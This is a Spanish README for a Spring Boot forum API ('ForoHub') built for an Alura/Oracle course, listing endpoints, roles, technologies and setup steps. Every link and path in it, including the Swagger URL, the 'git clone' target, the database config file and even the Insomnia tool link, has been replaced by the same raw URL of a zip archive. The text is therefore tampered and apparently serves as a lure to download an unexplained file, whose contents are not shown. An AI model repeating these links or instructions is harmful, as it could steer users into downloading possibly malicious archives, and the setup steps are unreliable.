# ForoHub API

¡Bienvenido a la API REST de ForoHub! Este proyecto es un sistema de foros en línea robusto y seguro, desarrollado como parte del desafío ONE de Alura LATAM y Oracle.

## 🚀 Funcionalidades

La API ofrece un conjunto completo de endpoints para gestionar un foro, incluyendo la creación y gestión de tópicos y respuestas, así como un sistema de autenticación y autorización seguro.

### Endpoints Principales

-   **`POST /login`**: Autenticación de usuario. Devuelve un token JWT para acceder a los endpoints protegidos.
-   **`POST /topicos`**: Crea un nuevo tópico. Requiere autenticación.
-   **`GET /topicos`**: Lista todos los tópicos. Requiere autenticación.
-   **`GET /topicos/{id}`**: Obtiene un tópico por su ID.
-   **`PUT /topicos/{id}`**: Actualiza un tópico existente. Requiere autenticación.
-   **`DELETE /topicos/{id}`**: Elimina un tópico por su ID. Requiere autenticación y privilegios de `ADMIN`.
-   **`POST /respuestas`**: Crea una nueva respuesta en un tópico. Requiere autenticación.
-   **`GET /respuestas/topico/{id}`**: Lista todas las respuestas de un tópico específico. Requiere autenticación.
-   **`POST /usuarios`**: Registra un nuevo usuario. Requiere autenticación con rol de `ADMIN`.

## 🛠️ Tecnologías y Herramientas

-   **Java 21**: Lenguaje de programación.
-   **Spring Boot 3.5.4**: Framework para la construcción de la API.
-   **Spring Security**: Gestión de autenticación y autorización.
-   **JSON Web Tokens (JWT)**: Método de autenticación basado en tokens.
-   **Spring Data JPA**: Abstracción para la persistencia de datos.
-   **MySQL**: Base de datos relacional para almacenar la información.
-   **Flyway**: Herramienta para la gestión de migraciones de la base de datos.
-   **Lombok**: Librería para reducir el código repetitivo (`boilerplate`).
-   **SpringDoc OpenAPI**: Herramienta para generar documentación de la API interactiva (Swagger UI).

## 🔑 Roles y Seguridad

La API implementa un sistema de control de acceso basado en roles para proteger los endpoints más sensibles. Los roles definidos son:

-   **`ADMIN`**: Puede realizar todas las operaciones, incluyendo la creación y eliminación de usuarios.
-   **`MODERATOR`**: Puede gestionar tópicos y respuestas.
-   **`USER`**: Puede crear tópicos y respuestas.

## 📄 Documentación Interactiva (Swagger)

Podes acceder a la documentación interactiva de la API para probar cada uno de los endpoints directamente desde tu navegador.
-   **URL**: `https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip`

Recordá autenticarte con un token JWT haciendo clic en el botón **`Authorize`** antes de probar los endpoints protegidos.

## ⚙️ Cómo Ejecutar el Proyecto

1.  **Clona el repositorio:**
    `git clone https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip`

2.  **Configura la base de datos:**
    Asegúrate de tener una base de datos MySQL configurada y actualiza el archivo `https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip` con tus credenciales. La aplicación utilizará Flyway para crear la estructura de la base de datos automáticamente.

3.  **Compila y ejecuta la aplicación:**
    Podes usar tu IDE (IntelliJ, VS Code) o el siguiente comando en la terminal:
    `./mvnw spring-boot:run`

4.  **Usá un cliente REST:**
    Una vez que la aplicación esté en funcionamiento, podes usar herramientas como [Insomnia](https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip) o Postman para interactuar con los endpoints de la API.
